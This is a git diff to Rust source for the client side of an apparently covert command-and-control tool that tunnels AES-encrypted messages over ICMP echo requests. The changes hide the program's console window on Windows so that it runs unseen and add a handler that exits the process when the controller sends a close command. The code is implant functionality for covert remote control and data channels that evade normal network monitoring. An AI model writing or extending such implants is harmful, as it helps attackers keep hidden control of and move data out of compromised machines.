@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyInit};
 use bincode::Options;
 use covert_c2_ping_common::{ClientConfig, PingMessage, BUF_SIZE, KEY_SIZE, STAMP_BYTE};
@@ -52,7 +54,7 @@ fn start_loop(
                 chan.put_message(PingMessage::DataMessage(out_data), id);
             }
             PingMessage::SleepMessage(new_time) => sleep_time = new_time,
-            _ => {}
+            PingMessage::CloseMessage => std::process::exit(0),
         };
     }
 }
@@ -104,14 +106,14 @@ fn send_ping(addr: [u8; 4], data: Vec<u8>) -> Result<Vec<u8>, ()> {
             u32::from_le_bytes(addr),
             data.as_ptr() as *const c_void,
             data.len().try_into().unwrap(),
-            None, // std::ptr::null(),
+            None,
             &mut replybuffer as *mut _ as *mut c_void,
             replysize,
             10000,
         );
         IcmpCloseHandle(handle);
         if result > 1 || result == 0 {
-            return Err(()); //"More than one response"
+            return Err(());
         }
         let response_data = slice::from_raw_parts(
             replybuffer.reply_data.Data as *const u8,
